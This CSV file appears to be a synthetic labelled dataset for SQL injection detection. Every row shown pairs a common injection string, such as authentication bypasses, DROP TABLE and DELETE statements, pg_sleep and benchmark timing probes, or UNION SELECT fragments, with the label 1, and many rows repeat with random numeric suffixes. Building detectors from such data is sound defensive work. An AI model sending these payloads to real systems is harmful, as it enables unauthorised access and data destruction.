payload,label
1; DELETE FROM items,1
admin' OR '1'='1,1
pg_sleep(10),1
"benchmark(10000000,MD5(1)) 27",1
DROP TABLE users,1
pg_sleep(10) 32,1
' OR 'a'='a,1
"benchmark(10000000,md5(1))",1
SELECT * FROM 50,1
admin' or '1'='1,1
1; delete from items,1
' or 1=1 #,1
select * from,1
SELECT * FROM 35,1
admin' or '1'='1 68,1
' or 1=1 #,1
"benchmark(10000000,md5(1))",1
' OR '1'='1' -- 35,1
drop table users,1
select * from 22,1
admin'/*,1
SELECT * FROM,1
1; DELETE FROM items,1
select * from,1
' OR 1=1 --,1
admin'/*,1
SELECT * FROM,1
drop table users,1
SELECT * FROM,1
admin'/*,1
admin'/*,1
select * from 2,1
drop table users 46,1
drop table users,1
' or 1=1 #,1
1; DELETE FROM items,1
' or 1=1 #,1
DROP TABLE users,1
SELECT * FROM,1
union select,1
admin'/* 67,1
' OR 1=1 --,1
admin'/*,1
1; DELETE FROM items,1
UNION SELECT,1
admin' --,1
"benchmark(10000000,MD5(1)) 65",1
SELECT * FROM,1
admin' -- 5,1
SELECT * FROM,1
select * from,1
admin' OR '1'='1 92,1
select * from,1
union select,1
admin' or '1'='1 49,1
drop table users,1
' OR '1'='1' -- 25,1
drop table users,1
admin' -- 81,1
' OR 1=1 -- 52,1
' OR 1=1 #,1
admin'/*,1
' or 1=1 -- 5,1
' or 1=1 --,1
' OR '1'='1' --,1
union select,1
"benchmark(10000000,md5(1)) 50",1
admin' or '1'='1,1
' OR 'a'='a,1
' or 1=1 #,1
pg_sleep(10) 90,1
admin' or '1'='1,1
' OR 1=1 # 100,1
1; delete from items,1
1; DELETE FROM items,1
UNION SELECT,1
' or 1=1 #,1
admin' --,1
DROP TABLE users,1
select * from,1
' or 1=1 --,1
UNION SELECT 66,1
' OR 1=1 --,1
pg_sleep(10),1
SELECT * FROM 98,1
' OR 1=1 #,1
union select,1
SELECT * FROM,1
1; DELETE FROM items 42,1
admin' OR '1'='1,1
' or '1'='1' --,1
pg_sleep(10),1
SELECT * FROM 95,1
pg_sleep(10) 81,1
SELECT * FROM,1
pg_sleep(10) 41,1
union select,1
"benchmark(10000000,MD5(1))",1
union select,1
DROP TABLE users,1
pg_sleep(10),1
' OR '1'='1' -- 51,1
drop table users,1
admin' --,1
admin' OR '1'='1,1
1; delete from items,1
' or '1'='1' --,1
union select,1
' or '1'='1' --,1
admin'/*,1
pg_sleep(10),1
' or '1'='1' --,1
1; DELETE FROM items,1
' or 1=1 #,1
admin' or '1'='1,1
1; DELETE FROM items,1
admin' OR '1'='1,1
' or '1'='1' --,1
' or 'a'='a 56,1
1; DELETE FROM items,1
admin' --,1
admin' -- 23,1
admin' OR '1'='1,1
admin'/*,1
DROP TABLE users,1
SELECT * FROM 73,1
' or 1=1 #,1
' or 'a'='a 5,1
select * from,1
drop table users,1
SELECT * FROM 5,1
UNION SELECT,1
"benchmark(10000000,MD5(1))",1
admin' --,1
' or 'a'='a,1
pg_sleep(10) 5,1
union select,1
' OR 'a'='a 83,1
' OR 'a'='a 72,1
admin' -- 27,1
UNION SELECT 39,1
UNION SELECT 13,1
' or 1=1 #,1
select * from,1
admin' or '1'='1,1
admin' or '1'='1 30,1
DROP TABLE users 55,1
"benchmark(10000000,md5(1))",1
admin' --,1
' OR 1=1 --,1
1; delete from items 54,1
DROP TABLE users 24,1
DROP TABLE users,1
1; delete from items,1
"benchmark(10000000,md5(1))",1
' or 'a'='a,1
' OR 1=1 # 11,1
' OR 1=1 #,1
' or 'a'='a 7,1
"benchmark(10000000,md5(1))",1
admin' OR '1'='1,1
pg_sleep(10),1
"benchmark(10000000,md5(1))",1
' or 1=1 --,1
admin' OR '1'='1,1
admin' or '1'='1 18,1
1; delete from items,1
' OR 1=1 # 50,1
"benchmark(10000000,md5(1)) 85",1
' or 1=1 --,1
admin' OR '1'='1,1
admin' --,1
admin' -- 82,1
' OR 1=1 --,1
admin' -- 20,1
' OR 1=1 --,1
admin'/*,1
union select 78,1
pg_sleep(10),1
' or '1'='1' -- 81,1
pg_sleep(10),1
union select,1
' or '1'='1' --,1
admin' -- 58,1
1; DELETE FROM items,1
admin' --,1
pg_sleep(10) 18,1
SELECT * FROM,1
admin' --,1
admin'/*,1
SELECT * FROM,1
' OR 1=1 --,1
SELECT * FROM,1
pg_sleep(10),1
' or 1=1 -- 40,1
admin' or '1'='1,1
1; DELETE FROM items 40,1
1; delete from items,1
admin' or '1'='1,1
admin' --,1
' or '1'='1' --,1
' OR 'a'='a,1
' OR '1'='1' -- 18,1
admin' --,1
admin'/*,1
"benchmark(10000000,MD5(1))",1
' or '1'='1' --,1
' OR 1=1 --,1
admin'/*,1
drop table users,1
admin' --,1
' OR 1=1 -- 67,1
' OR 'a'='a,1
admin' --,1
' OR 1=1 #,1
' or 1=1 -- 21,1
1; delete from items 39,1
union select,1
admin'/*,1
' or 1=1 --,1
' OR 1=1 --,1
' or 1=1 --,1
admin' or '1'='1 78,1
DROP TABLE users,1
' OR 1=1 --,1
' or '1'='1' --,1
union select,1
drop table users 35,1
' or 'a'='a,1
' OR 1=1 --,1
drop table users,1
"benchmark(10000000,md5(1))",1
"benchmark(10000000,MD5(1)) 5",1
"benchmark(10000000,MD5(1)) 72",1
"benchmark(10000000,md5(1)) 74",1
"benchmark(10000000,md5(1))",1
pg_sleep(10) 85,1
' or 1=1 --,1
' OR 1=1 -- 97,1
UNION SELECT 90,1
' OR 1=1 --,1
pg_sleep(10),1
' or '1'='1' --,1
DROP TABLE users,1
DROP TABLE users,1
admin'/*,1
DROP TABLE users,1
admin' OR '1'='1,1
select * from,1
admin' --,1
admin' OR '1'='1,1
' OR 1=1 # 52,1
admin'/* 96,1
pg_sleep(10) 83,1
' or 'a'='a 50,1
"benchmark(10000000,MD5(1)) 83",1
drop table users,1
admin'/*,1
admin'/*,1
drop table users,1
drop table users 17,1
admin'/*,1
' OR 1=1 --,1
admin' -- 47,1
1; delete from items,1
admin' or '1'='1 89,1
admin' OR '1'='1,1
select * from,1
DROP TABLE users 72,1
1; delete from items,1
' OR '1'='1' -- 71,1
' OR 1=1 # 12,1
' OR 'a'='a,1
pg_sleep(10) 21,1
admin' or '1'='1 29,1
union select,1
' or 'a'='a,1
drop table users 100,1
pg_sleep(10),1
' or '1'='1' --,1
1; DELETE FROM items,1
' OR 1=1 # 85,1
admin' --,1
admin'/*,1
UNION SELECT,1
drop table users,1
select * from,1
"benchmark(10000000,md5(1))",1
pg_sleep(10),1
' OR 1=1 --,1
' or 1=1 #,1
1; DELETE FROM items,1
DROP TABLE users,1
' or 'a'='a 63,1
select * from 91,1
1; delete from items,1
pg_sleep(10),1
' or 1=1 --,1
' or 1=1 --,1
admin' OR '1'='1,1
DROP TABLE users 89,1
pg_sleep(10),1
drop table users 39,1
' OR 1=1 #,1
' OR 1=1 #,1
SELECT * FROM,1
' OR 1=1 # 83,1
drop table users 9,1
union select,1
drop table users 31,1
admin' -- 99,1
1; delete from items,1
pg_sleep(10) 84,1
' OR 1=1 # 97,1
' or '1'='1' --,1
"benchmark(10000000,md5(1))",1
union select,1
' OR '1'='1' --,1
drop table users,1
' or 'a'='a 77,1
UNION SELECT 6,1
select * from 86,1
admin'/*,1
admin'/*,1
pg_sleep(10),1
' OR 1=1 #,1
"benchmark(10000000,md5(1)) 20",1
pg_sleep(10) 57,1
' OR 1=1 # 72,1
' or 1=1 #,1
pg_sleep(10),1
select * from,1
' OR 1=1 --,1
' OR 'a'='a,1
' or 'a'='a 94,1
admin'/*,1
"benchmark(10000000,MD5(1)) 27",1
1; DELETE FROM items,1
admin' or '1'='1,1
' or 1=1 # 5,1
' OR 1=1 -- 66,1
select * from 5,1
SELECT * FROM,1
pg_sleep(10),1
admin'/*,1
select * from,1
admin'/*,1
admin' or '1'='1,1
"benchmark(10000000,md5(1))",1
admin'/*,1
' or 'a'='a,1
' or 'a'='a 90,1
' OR 1=1 #,1
admin'/*,1
' or '1'='1' --,1
select * from,1
pg_sleep(10),1
' or 1=1 # 41,1
1; delete from items,1
union select,1
' or 'a'='a 70,1
' OR 'a'='a 8,1
' or 1=1 --,1
admin' --,1
"benchmark(10000000,md5(1))",1
' OR 1=1 --,1
1; delete from items 18,1
admin'/*,1
select * from,1
' OR 'a'='a,1
admin'/*,1
union select,1
' or 1=1 --,1
admin'/*,1
' or 'a'='a,1
' or '1'='1' --,1
admin' -- 41,1
DROP TABLE users,1
"benchmark(10000000,MD5(1)) 77",1
' or '1'='1' --,1
' OR '1'='1' --,1
pg_sleep(10) 98,1
admin'/*,1
' OR 'a'='a,1
"benchmark(10000000,MD5(1)) 59",1
pg_sleep(10),1
' OR 'a'='a,1
' OR 1=1 # 43,1
UNION SELECT,1
' or 1=1 #,1
' or 1=1 -- 82,1
admin'/* 77,1
admin' or '1'='1,1
"benchmark(10000000,MD5(1))",1
admin'/*,1
admin' OR '1'='1,1
admin'/*,1
' OR '1'='1' --,1
' OR 1=1 #,1
select * from 44,1
' or 'a'='a 29,1
admin' OR '1'='1,1
admin' or '1'='1,1
SELECT * FROM,1
union select,1
SELECT * FROM,1
' OR '1'='1' --,1
"benchmark(10000000,MD5(1)) 86",1
union select 72,1
DROP TABLE users,1
1; DELETE FROM items,1
1; DELETE FROM items,1
admin'/*,1
"benchmark(10000000,md5(1)) 51",1
admin'/* 64,1
' or 1=1 #,1
pg_sleep(10),1
pg_sleep(10),1
"benchmark(10000000,MD5(1))",1
' OR '1'='1' --,1
' OR '1'='1' --,1
SELECT * FROM,1
' or 'a'='a,1
' or '1'='1' --,1
' OR '1'='1' -- 68,1
1; DELETE FROM items,1
' OR 'a'='a 24,1
1; DELETE FROM items 44,1
' or 1=1 --,1
pg_sleep(10),1
' or 1=1 #,1
' or 'a'='a,1
"benchmark(10000000,MD5(1))",1
1; delete from items,1
admin'/* 30,1
admin' --,1
UNION SELECT,1
' or 1=1 --,1
1; delete from items,1
' OR 1=1 # 65,1
"benchmark(10000000,MD5(1)) 13",1
"benchmark(10000000,md5(1)) 67",1
1; delete from items,1
' OR '1'='1' -- 23,1
admin' --,1
DROP TABLE users,1
union select,1
pg_sleep(10),1
union select 48,1
admin' or '1'='1 38,1
' OR 1=1 #,1
pg_sleep(10),1
pg_sleep(10),1
select * from,1
drop table users,1
1; DELETE FROM items,1
' OR 'a'='a 63,1
admin'/*,1
' OR 1=1 #,1
' OR 1=1 --,1
drop table users,1
' OR 1=1 #,1
' OR '1'='1' --,1
1; delete from items 45,1
admin' or '1'='1,1
1; DELETE FROM items,1
SELECT * FROM,1
admin' or '1'='1 31,1
admin' -- 55,1
admin' --,1
pg_sleep(10),1
admin' OR '1'='1,1
' or 'a'='a,1
admin' -- 59,1
admin' --,1
' OR '1'='1' --,1
' OR '1'='1' -- 76,1
pg_sleep(10),1
' or 'a'='a 90,1
admin' -- 9,1
"benchmark(10000000,md5(1)) 23",1
SELECT * FROM,1
' OR 1=1 -- 30,1
' or 1=1 #,1
admin' OR '1'='1 88,1
' OR 1=1 #,1
' or 1=1 --,1
admin' or '1'='1,1
SELECT * FROM 31,1
union select 65,1
UNION SELECT 19,1
select * from,1
' or '1'='1' --,1
"benchmark(10000000,MD5(1)) 46",1
pg_sleep(10),1
union select,1
' or 'a'='a,1
drop table users 67,1
' OR '1'='1' --,1
admin'/*,1
SELECT * FROM,1
' OR '1'='1' --,1
admin'/*,1
pg_sleep(10),1
' or 1=1 # 4,1
' or 1=1 --,1
1; DELETE FROM items 24,1
"benchmark(10000000,md5(1))",1
pg_sleep(10),1
select * from,1
1; DELETE FROM items 21,1
"benchmark(10000000,MD5(1))",1
admin' --,1
admin' -- 95,1
drop table users,1
UNION SELECT 38,1
admin' OR '1'='1 45,1
DROP TABLE users,1
' OR 'a'='a,1
' or 1=1 --,1
union select,1
' OR 1=1 #,1
pg_sleep(10),1
admin' -- 29,1
admin' -- 27,1
' or 'a'='a,1
DROP TABLE users 90,1
UNION SELECT,1
' or '1'='1' --,1
SELECT * FROM 81,1
UNION SELECT,1
admin' --,1
' or 'a'='a 56,1
' OR 1=1 # 83,1
admin' --,1
admin'/*,1
admin' or '1'='1,1
' OR 1=1 -- 5,1
admin' --,1
UNION SELECT 72,1
select * from 12,1
admin'/* 15,1
1; delete from items 22,1
' or 1=1 --,1
admin' -- 56,1
"benchmark(10000000,md5(1))",1
SELECT * FROM 61,1
' or 1=1 --,1
' OR 'a'='a,1
admin'/* 87,1
"benchmark(10000000,MD5(1))",1
' or '1'='1' --,1
UNION SELECT,1
admin'/*,1
UNION SELECT,1
admin' OR '1'='1,1
"benchmark(10000000,MD5(1))",1
admin'/*,1
1; delete from items,1
admin' --,1
UNION SELECT,1
"benchmark(10000000,MD5(1))",1
' or 'a'='a,1
' OR 1=1 #,1
select * from 48,1
' OR '1'='1' -- 12,1
1; DELETE FROM items,1
' or '1'='1' -- 23,1
union select 42,1
DROP TABLE users,1
pg_sleep(10),1
admin' or '1'='1,1
SELECT * FROM,1
' or '1'='1' --,1
admin' OR '1'='1 3,1
DROP TABLE users,1
' OR '1'='1' -- 94,1
admin' OR '1'='1,1
DROP TABLE users,1
' OR '1'='1' -- 48,1
' OR '1'='1' --,1
DROP TABLE users 34,1
' or 1=1 --,1
admin' -- 12,1
union select,1
DROP TABLE users,1
union select,1
DROP TABLE users,1
admin' -- 63,1
admin'/*,1
admin'/*,1
admin' OR '1'='1,1
pg_sleep(10) 36,1
' or 'a'='a,1
SELECT * FROM 25,1
"benchmark(10000000,md5(1))",1
"benchmark(10000000,md5(1))",1
DROP TABLE users 55,1
1; delete from items,1
' or 'a'='a,1
' or 1=1 #,1
' OR 1=1 --,1
admin' -- 87,1
pg_sleep(10),1
admin'/*,1
"benchmark(10000000,md5(1)) 8",1
"benchmark(10000000,md5(1)) 65",1
admin' OR '1'='1,1
pg_sleep(10),1
' or 1=1 --,1
' or 1=1 --,1
' or 'a'='a,1
' or 'a'='a,1
' or 1=1 #,1
pg_sleep(10),1
"benchmark(10000000,md5(1))",1
admin' or '1'='1 69,1
admin'/*,1
"benchmark(10000000,MD5(1))",1
admin'/* 23,1
admin' --,1
' or 'a'='a,1
' OR 'a'='a 25,1
' OR 1=1 --,1
' OR 1=1 #,1
1; DELETE FROM items,1
admin' OR '1'='1 22,1
DROP TABLE users 23,1
admin' -- 17,1
admin' --,1
admin'/*,1
"benchmark(10000000,MD5(1)) 21",1
' or 1=1 # 10,1
DROP TABLE users,1
UNION SELECT,1
' or 1=1 #,1
' OR 'a'='a 26,1
' OR 'a'='a 4,1
"benchmark(10000000,md5(1))",1
drop table users 79,1
union select,1
' OR 1=1 # 92,1
' or 'a'='a,1
SELECT * FROM,1
union select 94,1
drop table users 24,1
admin' OR '1'='1,1
' OR 1=1 --,1
admin' -- 27,1
admin' or '1'='1 78,1
' or 1=1 --,1
admin'/*,1
DROP TABLE users,1
' or '1'='1' --,1
' or 1=1 --,1
' or 'a'='a,1
admin'/*,1
union select,1
pg_sleep(10),1
' or '1'='1' --,1
"benchmark(10000000,MD5(1))",1
select * from,1
admin' --,1
"benchmark(10000000,MD5(1))",1
' or 1=1 #,1
' or 'a'='a,1
' OR 'a'='a,1
' or 'a'='a,1
' or 'a'='a 93,1
1; delete from items 37,1
admin' --,1
pg_sleep(10),1
pg_sleep(10),1
pg_sleep(10),1
pg_sleep(10) 19,1
' OR 1=1 --,1
' OR 1=1 # 90,1
admin' --,1
' OR 'a'='a,1
' OR 1=1 # 81,1
1; DELETE FROM items,1
' or 'a'='a 78,1
admin' --,1
admin' --,1
SELECT * FROM,1
' or 1=1 --,1
1; delete from items,1
"benchmark(10000000,md5(1)) 93",1
admin' or '1'='1 73,1
' or 'a'='a,1
pg_sleep(10),1
' OR 1=1 -- 25,1
' or '1'='1' --,1
"benchmark(10000000,MD5(1))",1
' OR 'a'='a 3,1
pg_sleep(10) 52,1
UNION SELECT,1
admin' OR '1'='1 87,1
"benchmark(10000000,md5(1)) 47",1
1; delete from items 66,1
admin' -- 57,1
DROP TABLE users,1
' OR 'a'='a 87,1
admin' --,1
admin' --,1
DROP TABLE users 79,1
' OR '1'='1' --,1
UNION SELECT,1
' or 1=1 #,1
"benchmark(10000000,md5(1)) 44",1
"benchmark(10000000,md5(1)) 93",1
admin' OR '1'='1 77,1
pg_sleep(10),1
drop table users,1
' or 1=1 -- 29,1
1; delete from items,1
' or 1=1 # 30,1
pg_sleep(10) 49,1
"benchmark(10000000,md5(1))",1
"benchmark(10000000,md5(1)) 30",1
admin' --,1
' OR 1=1 --,1
' OR 'a'='a 81,1
pg_sleep(10),1
' OR 'a'='a,1
pg_sleep(10),1
UNION SELECT,1
' or 1=1 #,1
"benchmark(10000000,MD5(1)) 27",1
' OR 1=1 #,1
UNION SELECT,1
' or 1=1 # 14,1
admin' --,1
' OR '1'='1' --,1
SELECT * FROM 86,1
' or '1'='1' --,1
admin' or '1'='1 67,1
SELECT * FROM,1
admin' OR '1'='1,1
' or 'a'='a,1
' OR '1'='1' --,1
"benchmark(10000000,md5(1)) 56",1
"benchmark(10000000,md5(1))",1
' or 1=1 -- 63,1
DROP TABLE users,1
' or 'a'='a,1
"benchmark(10000000,MD5(1))",1
pg_sleep(10),1
admin' -- 65,1
pg_sleep(10),1
' OR 1=1 # 51,1
"benchmark(10000000,MD5(1)) 92",1
drop table users,1
admin' --,1
admin' --,1
admin'/* 38,1
' or 1=1 #,1
' or 1=1 # 1,1
' or 1=1 # 84,1
pg_sleep(10),1
1; DELETE FROM items,1
drop table users 26,1
"benchmark(10000000,md5(1))",1
admin' OR '1'='1,1
select * from,1
admin' --,1
1; DELETE FROM items 100,1
union select,1
admin'/*,1
' or 'a'='a,1
pg_sleep(10),1
admin' --,1
' or 1=1 -- 97,1
admin' or '1'='1,1
1; delete from items,1
' or '1'='1' --,1
union select,1
union select,1
' or 'a'='a,1
admin'/*,1
admin' OR '1'='1,1
admin' --,1
union select,1
' or 1=1 --,1
drop table users,1
DROP TABLE users 1,1
' OR 'a'='a 86,1
SELECT * FROM,1
select * from 83,1
drop table users,1
admin'/*,1
select * from 48,1
"benchmark(10000000,md5(1))",1
1; DELETE FROM items,1
' or 1=1 -- 8,1
UNION SELECT,1
' or '1'='1' --,1
admin' or '1'='1,1
' or 'a'='a 19,1
admin'/*,1
' or '1'='1' -- 91,1
SELECT * FROM,1
admin' or '1'='1,1
admin' --,1
DROP TABLE users,1
select * from 55,1
' or '1'='1' --,1
"benchmark(10000000,md5(1))",1
1; delete from items,1
admin'/* 33,1
' or 'a'='a,1
1; delete from items,1
' or 1=1 --,1
' or '1'='1' --,1
admin' --,1
' OR 1=1 --,1
admin' or '1'='1,1
' or 1=1 --,1
' OR '1'='1' --,1
' or '1'='1' --,1
1; DELETE FROM items,1
UNION SELECT,1
admin' -- 45,1
' or 1=1 --,1
SELECT * FROM,1
admin' or '1'='1 75,1
1; delete from items,1
select * from,1
"benchmark(10000000,MD5(1))",1
' OR 1=1 # 25,1
admin' or '1'='1,1
admin' or '1'='1 86,1
1; delete from items,1
' OR 1=1 --,1
admin'/* 98,1
"benchmark(10000000,md5(1))",1
admin'/*,1
drop table users,1
' or 1=1 --,1
DROP TABLE users,1
union select,1
"benchmark(10000000,md5(1))",1
' or 1=1 --,1
' or 1=1 --,1
' OR '1'='1' --,1
1; delete from items 77,1
' or 'a'='a,1
' or '1'='1' --,1
' or 1=1 --,1
' or '1'='1' --,1
"benchmark(10000000,MD5(1))",1
"benchmark(10000000,MD5(1))",1
UNION SELECT,1
' or 'a'='a 6,1
' or '1'='1' -- 95,1
' or 1=1 --,1
1; DELETE FROM items 8,1
' OR '1'='1' -- 69,1
' OR 1=1 --,1
admin'/* 59,1
pg_sleep(10) 33,1
